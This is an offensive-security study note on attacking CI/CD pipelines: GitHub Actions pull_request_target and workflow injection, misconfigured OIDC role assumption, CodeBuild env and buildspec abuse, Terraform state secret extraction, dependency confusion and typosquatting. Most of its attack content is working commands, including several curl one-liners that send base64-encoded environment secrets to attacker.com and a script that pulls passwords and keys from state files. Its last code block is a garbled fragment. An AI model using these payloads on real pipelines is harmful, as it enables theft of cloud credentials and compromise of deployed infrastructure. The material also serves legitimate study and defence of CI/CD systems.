# 05.5 — CI/CD Pipeline Attacks

## What This Note Covers

CI/CD pipelines are the supply chain of cloud infrastructure. They hold secrets, run with powerful IAM roles, and are frequently the path of least resistance into a cloud environment. This note covers GitHub Actions secret exposure, CodeBuild environment leakage, pipeline injection, and supply chain attacks.

---

## Why CI/CD Is a High-Value Target

CI/CD pipelines:
- Hold credentials for every environment they deploy to (dev, staging, prod)
- Run with IAM roles that have deployment permissions (often `Contributor` or `AdministratorAccess`)
- Pull from and push to code repositories — supply chain attack surface
- Are often less hardened than production systems
- Generate verbose logs that frequently contain secret values

> [!tip] Compromise the CI/CD pipeline, compromise everything it deploys to
> A GitHub Actions workflow with `AdministratorAccess` on AWS can deploy anything. Compromise it and you've compromised the AWS account without ever touching the account directly.

## GitHub Actions — Secret Exposure

### Where Secrets Live in GitHub Actions

```yaml
# Secrets defined at: repo → Settings → Secrets and variables → Actions
# Accessed in workflow as: ${{ secrets.SECRET_NAME }}

# Example workflow using a secret:
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 sync ./dist s3://prod-bucket/
```

### Attack 1: Pull Request Injection (Untrusted Input)

Workflows triggered by `pull_request` from forks have **no access to secrets** by default. But `pull_request_target` runs in the context of the base repo and **does have access to secrets** — dangerous for public repos.

```yaml
# VULNERABLE workflow using pull_request_target
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checkout attacker's code!
      - run: npm test  # executes attacker's code WITH access to repo secrets
```

**Exploitation:** Submit a PR to the target repo modifying the test script to exfiltrate secrets:

```bash
# In your fork, modify package.json test script:
"scripts": {
  "test": "curl -d \"$(env | base64)\" http://attacker.com/receive"
}

# When the PR triggers the vulnerable workflow:
# → attacker's code runs with repo secret access
# → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, etc. are exfiltrated
```

### Attack 2: Workflow File Injection

If you can push to a branch that triggers a workflow, you can inject malicious steps:

```yaml
# Malicious step added to a workflow:
- name: Debug step
  run: |
    curl -d "$(env | base64 -w0)" http://attacker.com/receive
    printenv | grep -i "secret\|key\|token\|pass" | base64 | curl -d @- http://attacker.com/
```

### Attack 3: OIDC Token Theft

GitHub Actions supports OIDC (OpenID Connect) to authenticate to cloud providers without storing long-lived secrets. If the OIDC trust policy is misconfigured:

```bash
# VULNERABLE AWS trust policy — allows ANY GitHub repo to assume the role
{
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:*:*"
    }
  }
}

# Correct — should restrict to specific org/repo/branch:
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:MyOrg/MyRepo:ref:refs/heads/main"
    }
  }
}
```

**Exploitation of misconfigured OIDC:**

```yaml
# From any GitHub repo, assume the victim's AWS role
name: OIDC Exploit
on: push
permissions:
  id-token: write
  contents: read
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::VICTIM_ACCOUNT:role/DeployRole  # victim's role
          aws-region: us-east-1
      - name: Enumerate
        run: |
          aws sts get-caller-identity
          aws s3 ls
          aws secretsmanager list-secrets
```

## AWS CodeBuild — Secrets Leakage

CodeBuild runs build jobs with an IAM service role. Secrets are passed via:
- Environment variables (plaintext or from Secrets Manager/Parameter Store)
- The build environment itself

### Enumeration

```bash
# List all CodeBuild projects
aws codebuild list-projects --region REGION

# Get project details including environment variables
aws codebuild batch-get-projects \
  --names PROJECT_NAME \
  --query 'projects[].environment.environmentVariables'

# WARNING: PLAINTEXT type env vars are returned in full
# SECRETS_MANAGER / PARAMETER_STORE types return the reference path (not value)

# Get build logs (may contain secret values printed by build scripts)
aws codebuild list-builds-for-project \
  --project-name PROJECT_NAME \
  --query 'ids[0]'

BUILD_ID="project:abc123"
aws codebuild batch-get-builds \
  --ids $BUILD_ID \
  --query 'builds[].logs.cloudWatchLogsArn'

# Get the CloudWatch log stream
aws logs get-log-events \
  --log-group-name /aws/codebuild/PROJECT_NAME \
  --log-stream-name BUILD_ID \
  --query 'events[].message'
```

### CodeBuild IAM Role Abuse

```bash
# Get the CodeBuild service role
aws codebuild batch-get-projects \
  --names PROJECT_NAME \
  --query 'projects[].serviceRole'

ROLE_ARN="arn:aws:iam::123456789012:role/CodeBuildServiceRole"
ROLE_NAME="CodeBuildServiceRole"

# Check what it can do (often has broad permissions to deploy)
aws iam list-attached-role-policies --role-name $ROLE_NAME
aws iam list-role-policies --role-name $ROLE_NAME

# If you can trigger a build and modify the buildspec:
# Your commands run with the CodeBuild service role
```

### Triggering a Malicious Build

If you can `codebuild:StartBuild` and influence the buildspec (either directly or via repo write access):

```bash
# Start a build with a malicious buildspec override
aws codebuild start-build \
  --project-name TARGET_PROJECT \
  --buildspec-override '
version: 0.2
phases:
  build:
    commands:
      - env | base64 | curl -d @- http://attacker.com/receive
      - aws sts get-caller-identity
      - aws secretsmanager list-secrets
      - aws s3 ls'
```

## Terraform State File Attacks

Terraform stores state in S3 (AWS), Azure Blob Storage (Azure), or GCS (GCP). State files contain:
- All resource IDs and configurations
- Sometimes plaintext secrets (DB passwords, API keys passed as variables)
- SSH private keys generated by Terraform

```bash
# AWS: find and read Terraform state files
aws s3 ls --recursive | grep terraform.tfstate
aws s3 cp s3://BUCKET/path/terraform.tfstate /tmp/

# Parse the state file for secrets
cat /tmp/terraform.tfstate | python3 -c "
import json, sys
state = json.load(sys.stdin)
resources = state.get('resources', [])
for r in resources:
    for instance in r.get('instances', []):
        attrs = instance.get('attributes', {})
        for k, v in attrs.items():
            if any(s in k.lower() for s in ['password', 'secret', 'key', 'token']):
                print(f'{r[\"type\"]}.{r[\"name\"]}.{k}: {v}')
"

# Azure: find Terraform state in blob storage
az storage blob list \
  --account-name STORAGE_ACCOUNT \
  --container-name tfstate \
  --output table
az storage blob download \
  --account-name STORAGE_ACCOUNT \
  --container-name tfstate \
  --name terraform.tfstate \
  --file /tmp/state.json

# GCP: find Terraform state in GCS
gsutil ls gs://BUCKET/ | grep tfstate
gsutil cp gs://BUCKET/terraform.tfstate /tmp/
```

## Supply Chain Attacks via Dependencies

### Dependency Confusion

If a CI/CD pipeline installs packages from both public registries (npm, PyPI) and private internal registries, an attacker can publish a malicious public package with a higher version number than the internal one — the package manager fetches the public (malicious) version.

```bash
# Discovery: identify internal package names
# - Inspect error messages from failed installs
# - Read requirements.txt / package.json in public repos
# - Find package names in build logs

# Attack: publish a higher-versioned package with the same name to PyPI/npm
# The malicious package's setup.py / install script exfiltrates environment:
# curl -d "$(env | base64)" http://attacker.com/receive

# Research by Alex Birsan demonstrated this against Microsoft, Apple, Tesla
```

### typosquatting in CI/CD

CI/CD scripts that `pip install` or `npm install` common package names are vulnerable to typosquatting:

```bash
# Package name confusion examples:
# requests → requsets
# boto3 → bota3
# django → djang0

# Malicious package publishes to PyPI/npm with typo name
# Developer fat-fingers the package name in requirements.txt
# CI/CD installs malicious package → code runs in build environment
# → environment variables (secrets) exfiltrated
```

```bash
  --query 'projects[].environment.environmentVariables'

  --log-group-name /aws/codebuild/PROJECT \

  --project-name PROJECT \
  --buildspec-override 'version: 0.2

# Check trust policies of roles that trust the OIDC provider
```
